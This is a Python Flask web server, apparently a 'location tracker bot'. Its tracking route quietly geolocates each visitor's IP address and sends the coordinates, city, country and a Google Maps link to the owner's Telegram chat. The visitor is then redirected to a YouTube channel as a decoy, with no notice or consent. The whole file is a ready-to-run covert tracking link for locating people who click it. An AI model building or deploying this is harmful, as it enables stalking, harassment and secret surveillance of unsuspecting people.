# app.py - Web server for tracking
from flask import Flask, request, redirect
import requests
import os
import logging
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
OWNER_CHAT_ID = os.environ.get('OWNER_CHAT_ID')

def get_location_from_ip(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'lat': data.get('lat'),
                    'lon': data.get('lon'),
                    'city': data.get('city'),
                    'country': data.get('country'),
                    'isp': data.get('isp')
                }
    except:
        pass
    return None

@app.route('/')
def home():
    return "✅ Location Tracker Bot is running!"

@app.route('/track/<slug>')
def track_redirect(slug):
    visitor_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    location = get_location_from_ip(visitor_ip)
    
    # Default redirect if something fails
    redirect_url = "https://www.youtube.com/@MrBeast"
    
    if BOT_TOKEN and OWNER_CHAT_ID and location:
        try:
            lat = location.get('lat')
            lon = location.get('lon')
            maps_link = f"https://www.google.com/maps?q={lat},{lon}&z=15"
            
            message = f"""
📍 <b>🎯 LOCATION DETECTED!</b>
━━━━━━━━━━━━━━━━━━━
📌 GPS: {lat}, {lon}
📍 {location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}
🗺️ <a href="{maps_link}">Click for Google Maps</a>
🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━
"""
            # Send text message
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': OWNER_CHAT_ID, 'text': message, 'parse_mode': 'HTML'},
                timeout=5
            )
            
            # Send location pin
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                json={'chat_id': OWNER_CHAT_ID, 'latitude': lat, 'longitude': lon},
                timeout=5
            )
            
            logging.info(f"📍 Location sent! {lat}, {lon}")
            
        except Exception as e:
            logging.error(f"Error: {e}")
    
    return redirect(redirect_url, code=302)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
